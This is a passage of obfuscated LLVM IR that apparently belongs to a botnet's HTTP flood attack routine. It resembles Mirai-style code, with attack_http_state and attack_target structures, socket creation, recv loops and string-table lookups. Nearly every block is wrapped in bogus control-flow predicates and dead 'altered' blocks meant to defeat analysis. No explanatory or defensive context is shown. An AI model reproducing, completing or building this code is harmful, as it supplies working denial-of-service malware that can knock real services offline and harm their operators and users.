  %3965 = icmp slt i32 %3960, 10
  %3966 = or i1 %3964, %3965
  br i1 %3966, label %originalBBpart2637, label %originalBB635alteredBB

originalBBpart2637:                               ; preds = %originalBB635
  br label %4032

; <label>:3967:                                   ; preds = %originalBBpart2633
  %3968 = load i32, i32* %59, align 4
  %3969 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3970 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3969, i32 0, i32 17
  %3971 = load i32, i32* %3970, align 4
  %3972 = sub nsw i32 %3971, %3968
  store i32 %3972, i32* %3970, align 4
  %3973 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3974 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3973, i32 0, i32 18
  %3975 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3974, i32 0, i32 0
  %3976 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3977 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3976, i32 0, i32 18
  %3978 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3977, i32 0, i32 0
  %3979 = load i32, i32* %59, align 4
  %3980 = sext i32 %3979 to i64
  %3981 = getelementptr inbounds i8, i8* %3978, i64 %3980
  %3982 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3983 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3982, i32 0, i32 17
  %3984 = load i32, i32* %3983, align 4
  %3985 = sext i32 %3984 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %3975, i8* %3981, i64 %3985, i32 1, i1 false)
  %3986 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3987 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3986, i32 0, i32 18
  %3988 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3989 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3988, i32 0, i32 17
  %3990 = load i32, i32* %3989, align 4
  %3991 = sext i32 %3990 to i64
  %3992 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3987, i64 0, i64 %3991
  store i8 0, i8* %3992, align 1
  %3993 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3994 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3993, i32 0, i32 17
  %3995 = load i32, i32* %3994, align 4
  %3996 = icmp eq i32 %3995, 0
  br i1 %3996, label %3997, label %4014

; <label>:3997:                                   ; preds = %3967
  %3998 = load i32, i32* @x.17
  %3999 = load i32, i32* @y.18
  %4000 = sub i32 %3998, 1
  %4001 = mul i32 %3998, %4000
  %4002 = urem i32 %4001, 2
  %4003 = icmp eq i32 %4002, 0
  %4004 = icmp slt i32 %3999, 10
  %4005 = or i1 %4003, %4004
  br i1 %4005, label %originalBB639, label %originalBB639alteredBB

originalBB639:                                    ; preds = %originalBB639alteredBB, %3997
  %4006 = load i32, i32* @x.17
  %4007 = load i32, i32* @y.18
  %4008 = sub i32 %4006, 1
  %4009 = mul i32 %4006, %4008
  %4010 = urem i32 %4009, 2
  %4011 = icmp eq i32 %4010, 0
  %4012 = icmp slt i32 %4007, 10
  %4013 = or i1 %4011, %4012
  br i1 %4013, label %originalBBpart2641, label %originalBB639alteredBB

originalBBpart2641:                               ; preds = %originalBB639
  br label %4032

; <label>:4014:                                   ; preds = %3967
  br label %4015

; <label>:4015:                                   ; preds = %4014
  %4016 = load i32, i32* @x.17
  %4017 = load i32, i32* @y.18
  %4018 = sub i32 %4016, 1
  %4019 = mul i32 %4016, %4018
  %4020 = urem i32 %4019, 2
  %4021 = icmp eq i32 %4020, 0
  %4022 = icmp slt i32 %4017, 10
  %4023 = or i1 %4021, %4022
  br i1 %4023, label %originalBB643, label %originalBB643alteredBB

originalBB643:                                    ; preds = %originalBB643alteredBB, %4015
  %4024 = load i32, i32* @x.17
  %4025 = load i32, i32* @y.18
  %4026 = sub i32 %4024, 1
  %4027 = mul i32 %4024, %4026
  %4028 = urem i32 %4027, 2
  %4029 = icmp eq i32 %4028, 0
  %4030 = icmp slt i32 %4025, 10
  %4031 = or i1 %4029, %4030
  br i1 %4031, label %originalBBpart2645, label %originalBB643alteredBB

originalBBpart2645:                               ; preds = %originalBB643
  br label %3576

; <label>:4032:                                   ; preds = %originalBBpart2641, %originalBBpart2637, %originalBBpart2629, %originalBBpart2620, %3761
  br label %3418

; <label>:4033:                                   ; preds = %originalBBpart2586, %3440
  br label %4214

; <label>:4034:                                   ; preds = %3411
  %4035 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4036 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4035, i32 0, i32 1
  %4037 = load i8, i8* %4036, align 4
  %4038 = zext i8 %4037 to i32
  %4039 = icmp eq i32 %4038, 10
  br i1 %4039, label %4040, label %4197

; <label>:4040:                                   ; preds = %4034
  br label %4041

; <label>:4041:                                   ; preds = %4154, %4040
  %4042 = load i32, i32* @x.17
  %4043 = load i32, i32* @y.18
  %4044 = sub i32 %4042, 1
  %4045 = mul i32 %4042, %4044
  %4046 = urem i32 %4045, 2
  %4047 = icmp eq i32 %4046, 0
  %4048 = icmp slt i32 %4043, 10
  %4049 = or i1 %4047, %4048
  br i1 %4049, label %originalBB647, label %originalBB647alteredBB

originalBB647:                                    ; preds = %originalBB647alteredBB, %4041
  %4050 = call i32* @__errno_location() #7
  store i32 0, i32* %4050, align 4
  %4051 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4052 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4051, i32 0, i32 0
  %4053 = load i32, i32* %4052, align 4
  %4054 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4055 = call i64 @recv(i32 %4053, i8* %4054, i64 10240, i32 16384)
  %4056 = trunc i64 %4055 to i32
  store i32 %4056, i32* %12, align 4
  %4057 = load i32, i32* %12, align 4
  %4058 = icmp eq i32 %4057, 0
  %4059 = load i32, i32* @x.17
  %4060 = load i32, i32* @y.18
  %4061 = sub i32 %4059, 1
  %4062 = mul i32 %4059, %4061
  %4063 = urem i32 %4062, 2
  %4064 = icmp eq i32 %4063, 0
  %4065 = icmp slt i32 %4060, 10
  %4066 = or i1 %4064, %4065
  br i1 %4066, label %originalBBpart2649, label %originalBB647alteredBB

originalBBpart2649:                               ; preds = %originalBB647
  br i1 %4058, label %4067, label %4085

; <label>:4067:                                   ; preds = %originalBBpart2649
  %4068 = load i32, i32* @x.17
  %4069 = load i32, i32* @y.18
  %4070 = sub i32 %4068, 1
  %4071 = mul i32 %4068, %4070
  %4072 = urem i32 %4071, 2
  %4073 = icmp eq i32 %4072, 0
  %4074 = icmp slt i32 %4069, 10
  %4075 = or i1 %4073, %4074
  br i1 %4075, label %originalBB651, label %originalBB651alteredBB

originalBB651:                                    ; preds = %originalBB651alteredBB, %4067
  %4076 = call i32* @__errno_location() #7
  store i32 104, i32* %4076, align 4
  store i32 -1, i32* %12, align 4
  %4077 = load i32, i32* @x.17
  %4078 = load i32, i32* @y.18
  %4079 = sub i32 %4077, 1
  %4080 = mul i32 %4077, %4079
  %4081 = urem i32 %4080, 2
  %4082 = icmp eq i32 %4081, 0
  %4083 = icmp slt i32 %4078, 10
  %4084 = or i1 %4082, %4083
  br i1 %4084, label %originalBBpart2653, label %originalBB651alteredBB

originalBBpart2653:                               ; preds = %originalBB651
  br label %4085

; <label>:4085:                                   ; preds = %originalBBpart2653, %originalBBpart2649
  %4086 = load i32, i32* %12, align 4
  %4087 = icmp eq i32 %4086, -1
  br i1 %4087, label %4088, label %4154

; <label>:4088:                                   ; preds = %4085
  %4089 = load i32, i32* @x.17
  %4090 = load i32, i32* @y.18
  %4091 = sub i32 %4089, 1
  %4092 = mul i32 %4089, %4091
  %4093 = urem i32 %4092, 2
  %4094 = icmp eq i32 %4093, 0
  %4095 = icmp slt i32 %4090, 10
  %4096 = or i1 %4094, %4095
  br i1 %4096, label %originalBB655, label %originalBB655alteredBB

originalBB655:                                    ; preds = %originalBB655alteredBB, %4088
  %4097 = call i32* @__errno_location() #7
  %4098 = load i32, i32* %4097, align 4
  %4099 = icmp ne i32 %4098, 11
  %4100 = load i32, i32* @x.17
  %4101 = load i32, i32* @y.18
  %4102 = sub i32 %4100, 1
  %4103 = mul i32 %4100, %4102
  %4104 = urem i32 %4103, 2
  %4105 = icmp eq i32 %4104, 0
  %4106 = icmp slt i32 %4101, 10
  %4107 = or i1 %4105, %4106
  br i1 %4107, label %originalBBpart2657, label %originalBB655alteredBB

originalBBpart2657:                               ; preds = %originalBB655
  br i1 %4099, label %4108, label %4153

; <label>:4108:                                   ; preds = %originalBBpart2657
  %4109 = load i32, i32* @x.17
  %4110 = load i32, i32* @y.18
  %4111 = sub i32 %4109, 1
  %4112 = mul i32 %4109, %4111
  %4113 = urem i32 %4112, 2
  %4114 = icmp eq i32 %4113, 0
  %4115 = icmp slt i32 %4110, 10
  %4116 = or i1 %4114, %4115
  br i1 %4116, label %originalBB659, label %originalBB659alteredBB

originalBB659:                                    ; preds = %originalBB659alteredBB, %4108
  %4117 = call i32* @__errno_location() #7
  %4118 = load i32, i32* %4117, align 4
  %4119 = icmp ne i32 %4118, 11
  %4120 = load i32, i32* @x.17
  %4121 = load i32, i32* @y.18
  %4122 = sub i32 %4120, 1
  %4123 = mul i32 %4120, %4122
  %4124 = urem i32 %4123, 2
  %4125 = icmp eq i32 %4124, 0
  %4126 = icmp slt i32 %4121, 10
  %4127 = or i1 %4125, %4126
  br i1 %4127, label %originalBBpart2661, label %originalBB659alteredBB

originalBBpart2661:                               ; preds = %originalBB659
  br i1 %4119, label %4128, label %4153

; <label>:4128:                                   ; preds = %originalBBpart2661
  %4129 = load i32, i32* @x.17
  %4130 = load i32, i32* @y.18
  %4131 = sub i32 %4129, 1
  %4132 = mul i32 %4129, %4131
  %4133 = urem i32 %4132, 2
  %4134 = icmp eq i32 %4133, 0
  %4135 = icmp slt i32 %4130, 10
  %4136 = or i1 %4134, %4135
  br i1 %4136, label %originalBB663, label %originalBB663alteredBB

originalBB663:                                    ; preds = %originalBB663alteredBB, %4128
  %4137 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4138 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4137, i32 0, i32 0
  %4139 = load i32, i32* %4138, align 4
  %4140 = call i32 @close(i32 %4139)
  %4141 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4142 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4141, i32 0, i32 0
  store i32 -1, i32* %4142, align 4
  %4143 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4144 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4143, i32 0, i32 1
  store i8 0, i8* %4144, align 4
  %4145 = load i32, i32* @x.17
  %4146 = load i32, i32* @y.18
  %4147 = sub i32 %4145, 1
  %4148 = mul i32 %4145, %4147
  %4149 = urem i32 %4148, 2
  %4150 = icmp eq i32 %4149, 0
  %4151 = icmp slt i32 %4146, 10
  %4152 = or i1 %4150, %4151
  br i1 %4152, label %originalBBpart2665, label %originalBB663alteredBB

originalBBpart2665:                               ; preds = %originalBB663
  br label %4153

; <label>:4153:                                   ; preds = %originalBBpart2665, %originalBBpart2661, %originalBBpart2657
  br label %4155

; <label>:4154:                                   ; preds = %4085
  br label %4041

; <label>:4155:                                   ; preds = %4153
  %4156 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4157 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4156, i32 0, i32 1
  %4158 = load i8, i8* %4157, align 4
  %4159 = zext i8 %4158 to i32
  %4160 = icmp ne i32 %4159, 0
  br i1 %4160, label %4161, label %4180

; <label>:4161:                                   ; preds = %4155
  %4162 = load i32, i32* @x.17
  %4163 = load i32, i32* @y.18
  %4164 = sub i32 %4162, 1
  %4165 = mul i32 %4162, %4164
  %4166 = urem i32 %4165, 2
  %4167 = icmp eq i32 %4166, 0
  %4168 = icmp slt i32 %4163, 10
  %4169 = or i1 %4167, %4168
  br i1 %4169, label %originalBB667, label %originalBB667alteredBB

originalBB667:                                    ; preds = %originalBB667alteredBB, %4161
  %4170 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4171 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4170, i32 0, i32 1
  store i8 1, i8* %4171, align 4
  %4172 = load i32, i32* @x.17
  %4173 = load i32, i32* @y.18
  %4174 = sub i32 %4172, 1
  %4175 = mul i32 %4172, %4174
  %4176 = urem i32 %4175, 2
  %4177 = icmp eq i32 %4176, 0
  %4178 = icmp slt i32 %4173, 10
  %4179 = or i1 %4177, %4178
  br i1 %4179, label %originalBBpart2669, label %originalBB667alteredBB

originalBBpart2669:                               ; preds = %originalBB667
  br label %4180

; <label>:4180:                                   ; preds = %originalBBpart2669, %4155
  %4181 = load i32, i32* @x.17
  %4182 = load i32, i32* @y.18
  %4183 = sub i32 %4181, 1
  %4184 = mul i32 %4181, %4183
  %4185 = urem i32 %4184, 2
  %4186 = icmp eq i32 %4185, 0
  %4187 = icmp slt i32 %4182, 10
  %4188 = or i1 %4186, %4187
  br i1 %4188, label %originalBB671, label %originalBB671alteredBB

originalBB671:                                    ; preds = %originalBB671alteredBB, %4180
  %4189 = load i32, i32* @x.17
  %4190 = load i32, i32* @y.18
  %4191 = sub i32 %4189, 1
  %4192 = mul i32 %4189, %4191
  %4193 = urem i32 %4192, 2
  %4194 = icmp eq i32 %4193, 0
  %4195 = icmp slt i32 %4190, 10
  %4196 = or i1 %4194, %4195
  br i1 %4196, label %originalBBpart2673, label %originalBB671alteredBB

originalBBpart2673:                               ; preds = %originalBB671
  br label %4197

; <label>:4197:                                   ; preds = %originalBBpart2673, %4034
  %4198 = load i32, i32* @x.17
  %4199 = load i32, i32* @y.18
  %4200 = sub i32 %4198, 1
  %4201 = mul i32 %4198, %4200
  %4202 = urem i32 %4201, 2
  %4203 = icmp eq i32 %4202, 0
  %4204 = icmp slt i32 %4199, 10
  %4205 = or i1 %4203, %4204
  br i1 %4205, label %originalBB675, label %originalBB675alteredBB

originalBB675:                                    ; preds = %originalBB675alteredBB, %4197
  %4206 = load i32, i32* @x.17
  %4207 = load i32, i32* @y.18
  %4208 = sub i32 %4206, 1
  %4209 = mul i32 %4206, %4208
  %4210 = urem i32 %4209, 2
  %4211 = icmp eq i32 %4210, 0
  %4212 = icmp slt i32 %4207, 10
  %4213 = or i1 %4211, %4212
  br i1 %4213, label %originalBBpart2677, label %originalBB675alteredBB

originalBBpart2677:                               ; preds = %originalBB675
  br label %4214

; <label>:4214:                                   ; preds = %originalBBpart2677, %4033
  br label %4215

; <label>:4215:                                   ; preds = %4214, %3402
  br label %4216

; <label>:4216:                                   ; preds = %4215, %1609
  %4217 = load i32, i32* @x.17
  %4218 = load i32, i32* @y.18
  %4219 = sub i32 %4217, 1
  %4220 = mul i32 %4217, %4219
  %4221 = urem i32 %4220, 2
  %4222 = icmp eq i32 %4221, 0
  %4223 = icmp slt i32 %4218, 10
  %4224 = or i1 %4222, %4223
  br i1 %4224, label %originalBB679, label %originalBB679alteredBB

originalBB679:                                    ; preds = %originalBB679alteredBB, %4216
  %4225 = load i32, i32* @x.17
  %4226 = load i32, i32* @y.18
  %4227 = sub i32 %4225, 1
  %4228 = mul i32 %4225, %4227
  %4229 = urem i32 %4228, 2
  %4230 = icmp eq i32 %4229, 0
  %4231 = icmp slt i32 %4226, 10
  %4232 = or i1 %4230, %4231
  br i1 %4232, label %originalBBpart2681, label %originalBB679alteredBB

originalBBpart2681:                               ; preds = %originalBB679
  br label %4233

; <label>:4233:                                   ; preds = %originalBBpart2681, %3330, %2647, %originalBBpart2247, %1657, %1599, %1535
  %4234 = load i32, i32* %9, align 4
  %4235 = add nsw i32 %4234, 1
  store i32 %4235, i32* %9, align 4
  br label %1522

; <label>:4236:                                   ; preds = %1522
  br label %590

; <label>:4237:                                   ; preds = %originalBBpart216, %147, %originalBBpart24, %105
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %86
  %4238 = load i8*, i8** %17, align 8
  %4239 = icmp eq i8* %4238, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %110
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %127
  %4240 = load i8*, i8** %16, align 8
  %4241 = call i32 @util_strlen(i8* %4240)
  %4242 = icmp sgt i32 %4241, 127
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %148
  %4243 = load i8*, i8** %15, align 8
  %4244 = call i32 @util_strlen(i8* %4243)
  %4245 = icmp sgt i32 %4244, 9
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %168
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %186
  %4246 = load i32, i32* %10, align 4
  %4247 = load i8*, i8** %15, align 8
  %4248 = call i32 @util_strlen(i8* %4247)
  %4249 = icmp slt i32 %4246, %4248
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %207
  %4250 = load i8*, i8** %15, align 8
  %4251 = load i32, i32* %10, align 4
  %4252 = sext i32 %4251 to i64
  %4253 = getelementptr inbounds i8, i8* %4250, i64 %4252
  %4254 = load i8, i8* %4253, align 1
  %4255 = sext i8 %4254 to i32
  %4256 = icmp sge i32 %4255, 97
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %252
  %4257 = load i32, i32* %18, align 4
  %4258 = icmp sgt i32 %4257, 512
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %277
  %4259 = load i32, i32* %9, align 4
  %4260 = load i32, i32* %18, align 4
  %4261 = icmp slt i32 %4259, %4260
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %297
  %4262 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4263 = load i32, i32* %9, align 4
  %4264 = sext i32 %4263 to i64
  %4265 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4262, i64 %4264
  %4266 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4265, i32 0, i32 1
  store i8 0, i8* %4266, align 4
  %4267 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4268 = load i32, i32* %9, align 4
  %4269 = sext i32 %4268 to i64
  %4270 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4267, i64 %4269
  %4271 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4270, i32 0, i32 0
  store i32 -1, i32* %4271, align 4
  %4272 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %4273 = load i32, i32* %9, align 4
  %4274 = load i8, i8* %5, align 1
  %4275 = zext i8 %4274 to i32
  %_ = sub i32 0, %4273
  %gen = add i32 %_, %4275
  %4276 = srem i32 %4273, %4275
  %4277 = sext i32 %4276 to i64
  %4278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %4272, i64 %4277
  %4279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %4278, i32 0, i32 1
  %4280 = load i32, i32* %4279, align 4
  %4281 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4282 = load i32, i32* %9, align 4
  %4283 = sext i32 %4282 to i64
  %4284 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4281, i64 %4283
  %4285 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4284, i32 0, i32 4
  store i32 %4280, i32* %4285, align 4
  %4286 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4287 = load i32, i32* %9, align 4
  %4288 = sext i32 %4287 to i64
  %4289 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4286, i64 %4288
  %4290 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4289, i32 0, i32 6
  %4291 = getelementptr inbounds [257 x i8], [257 x i8]* %4290, i32 0, i32 0
  %4292 = load i8*, i8** %17, align 8
  %4293 = call i32 @util_strcpy(i8* %4291, i8* %4292)
  %4294 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4295 = load i32, i32* %9, align 4
  %4296 = sext i32 %4295 to i64
  %4297 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4294, i64 %4296
  %4298 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4297, i32 0, i32 6
  %4299 = getelementptr inbounds [257 x i8], [257 x i8]* %4298, i64 0, i64 0
  %4300 = load i8, i8* %4299, align 4
  %4301 = sext i8 %4300 to i32
  %4302 = icmp ne i32 %4301, 47
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %383
  %4303 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4304 = load i32, i32* %9, align 4
  %4305 = sext i32 %4304 to i64
  %4306 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4303, i64 %4305
  %4307 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4306, i32 0, i32 10
  %4308 = getelementptr inbounds [9 x i8], [9 x i8]* %4307, i32 0, i32 0
  %4309 = load i8*, i8** %15, align 8
  %4310 = call i32 @util_strcpy(i8* %4308, i8* %4309)
  %4311 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4312 = load i32, i32* %9, align 4
  %4313 = sext i32 %4312 to i64
  %4314 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4311, i64 %4313
  %4315 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4314, i32 0, i32 9
  %4316 = getelementptr inbounds [9 x i8], [9 x i8]* %4315, i32 0, i32 0
  %4317 = load i8*, i8** %15, align 8
  %4318 = call i32 @util_strcpy(i8* %4316, i8* %4317)
  %4319 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4320 = load i32, i32* %9, align 4
  %4321 = sext i32 %4320 to i64
  %4322 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4319, i64 %4321
  %4323 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4322, i32 0, i32 7
  %4324 = getelementptr inbounds [129 x i8], [129 x i8]* %4323, i32 0, i32 0
  %4325 = load i8*, i8** %16, align 8
  %4326 = call i32 @util_strcpy(i8* %4324, i8* %4325)
  %4327 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %4328 = load i32, i32* %9, align 4
  %4329 = load i8, i8* %5, align 1
  %4330 = zext i8 %4329 to i32
  %_39 = sub i32 %4328, %4330
  %gen40 = mul i32 %_39, %4330
  %_41 = sub i32 0, %4328
  %gen42 = add i32 %_41, %4330
  %4331 = srem i32 %4328, %4330
  %4332 = sext i32 %4331 to i64
  %4333 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %4327, i64 %4332
  %4334 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %4333, i32 0, i32 2
  %4335 = load i8, i8* %4334, align 4
  %4336 = zext i8 %4335 to i32
  %4337 = icmp slt i32 %4336, 32
  br label %originalBB38

originalBB46alteredBB:                            ; preds = %originalBB46, %477
  call void @table_unlock_val(i8 zeroext 55)
  %4338 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4339 = load i32, i32* %9, align 4
  %4340 = sext i32 %4339 to i64
  %4341 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4338, i64 %4340
  %4342 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4341, i32 0, i32 5
  %4343 = getelementptr inbounds [512 x i8], [512 x i8]* %4342, i32 0, i32 0
  %4344 = call i8* @table_retrieve_val(i32 55, i32* null)
  %4345 = call i32 @util_strcpy(i8* %4343, i8* %4344)
  call void @table_lock_val(i8 zeroext 55)
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %511
  call void @table_unlock_val(i8 zeroext 57)
  %4346 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4347 = load i32, i32* %9, align 4
  %4348 = sext i32 %4347 to i64
  %4349 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4346, i64 %4348
  %4350 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4349, i32 0, i32 5
  %4351 = getelementptr inbounds [512 x i8], [512 x i8]* %4350, i32 0, i32 0
  %4352 = call i8* @table_retrieve_val(i32 57, i32* null)
  %4353 = call i32 @util_strcpy(i8* %4351, i8* %4352)
  call void @table_lock_val(i8 zeroext 57)
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %545
  %4354 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4355 = load i32, i32* %9, align 4
  %4356 = sext i32 %4355 to i64
  %4357 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4354, i64 %4356
  %4358 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4357, i32 0, i32 6
  %4359 = getelementptr inbounds [257 x i8], [257 x i8]* %4358, i32 0, i32 0
  %4360 = load i8*, i8** %17, align 8
  %4361 = call i32 @util_strcpy(i8* %4359, i8* %4360)
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %573
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %590
  store i32 0, i32* %23, align 4
  %4362 = call i64 @time(i64* null) #6
  %4363 = trunc i64 %4362 to i32
  store i32 %4363, i32* %27, align 4
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %609
  %4364 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %4365 = getelementptr inbounds [16 x i64], [16 x i64]* %4364, i64 0, i64 0
  %4366 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %4365) #6, !srcloc !1
  %4367 = extractvalue { i64, i64* } %4366, 0
  %4368 = extractvalue { i64, i64* } %4366, 1
  %4369 = trunc i64 %4367 to i32
  store i32 %4369, i32* %28, align 4
  %4370 = ptrtoint i64* %4368 to i64
  %4371 = trunc i64 %4370 to i32
  store i32 %4371, i32* %29, align 4
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %635
  %4372 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %4373 = getelementptr inbounds [16 x i64], [16 x i64]* %4372, i64 0, i64 0
  %4374 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %4373) #6, !srcloc !2
  %4375 = extractvalue { i64, i64* } %4374, 0
  %4376 = extractvalue { i64, i64* } %4374, 1
  %4377 = trunc i64 %4375 to i32
  store i32 %4377, i32* %30, align 4
  %4378 = ptrtoint i64* %4376 to i64
  %4379 = trunc i64 %4378 to i32
  store i32 %4379, i32* %31, align 4
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %665
  %4380 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4381 = load i32, i32* %9, align 4
  %4382 = sext i32 %4381 to i64
  %4383 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4380, i64 %4382
  store %struct.attack_http_state* %4383, %struct.attack_http_state** %26, align 8
  %4384 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4385 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4384, i32 0, i32 1
  %4386 = load i8, i8* %4385, align 4
  %4387 = zext i8 %4386 to i32
  %4388 = icmp eq i32 %4387, 1
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %720
  %4389 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %4390 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4391 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4390, i32 0, i32 0
  store i32 %4389, i32* %4391, align 4
  %4392 = icmp eq i32 %4389, -1
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %741
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %815
  %4393 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4394 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4393, i32 0, i32 0
  %4395 = load i32, i32* %4394, align 4
  %_87 = sub i32 %4395, 1
  %gen88 = mul i32 %_87, 1
  %_89 = shl i32 %4395, 1
  %_90 = sub i32 0, %4395
  %gen91 = add i32 %_90, 1
  %_92 = sub i32 %4395, 1
  %gen93 = mul i32 %_92, 1
  %_94 = sub i32 %4395, 1
  %gen95 = mul i32 %_94, 1
  %4396 = add nsw i32 %4395, 1
  store i32 %4396, i32* %23, align 4
  br label %originalBB86

originalBB99alteredBB:                            ; preds = %originalBB99, %843
  %4397 = load i32, i32* %27, align 4
  %4398 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4399 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4398, i32 0, i32 2
  %4400 = load i32, i32* %4399, align 4
  %_100 = sub i32 0, %4397
  %gen101 = add i32 %_100, %4400
  %_102 = sub i32 0, %4397
  %gen103 = add i32 %_102, %4400
  %_104 = sub i32 %4397, %4400
  %gen105 = mul i32 %_104, %4400
  %_106 = shl i32 %4397, %4400
  %_107 = sub i32 0, %4397
  %gen108 = add i32 %_107, %4400
  %_109 = shl i32 %4397, %4400
  %4401 = sub i32 %4397, %4400
  %4402 = icmp ugt i32 %4401, 30
  br label %originalBB99

originalBB113alteredBB:                           ; preds = %originalBB113, %875
